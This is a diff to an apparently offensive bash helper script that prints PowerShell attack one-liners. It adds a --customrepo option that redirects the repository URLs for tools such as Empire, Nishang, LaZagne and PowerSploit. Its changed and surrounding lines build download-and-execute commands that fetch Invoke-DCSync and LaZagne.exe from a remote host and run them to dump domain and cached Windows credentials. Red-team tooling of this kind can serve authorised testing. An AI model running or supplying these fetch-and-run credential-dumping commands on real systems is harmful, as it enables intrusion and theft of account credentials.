@@ -107,6 +107,17 @@ while [ $# -gt 0 ]; do
                 shift
                 ;;
        
+        -c | --customrepo)
+                EmpireRepo="$2";
+		NishangRepo="$2";
+		PentestFactoryRepo="$2";
+		LazagneRepo="$2";
+		PowerSploitRepo="$2";
+		S3cur3Th1sSh1tRepo="$2";
+                shift
+                shift
+                ;;
+       
                                                                                                                                         
                 
         *)
@@ -491,7 +502,7 @@ echo -e ""
 echo -e "${IBLUE}NTDS${RESTORE}"
 echo -e "${LRED}WORK IN PROGRESS${RESTORE}"
 echo -e ""
-echo -e "$DownloadMethod $PentestFactoryRepo""/Invoke-DCSync.ps1');Invoke-DCSync"
+echo -e "$DownloadMethod $PentestFactoryRepo""Invoke-DCSync.ps1');Invoke-DCSync"
 echo -e ""
 echo -e "${IBLUE}Cached Domain Credentials${RESTORE}"
 echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
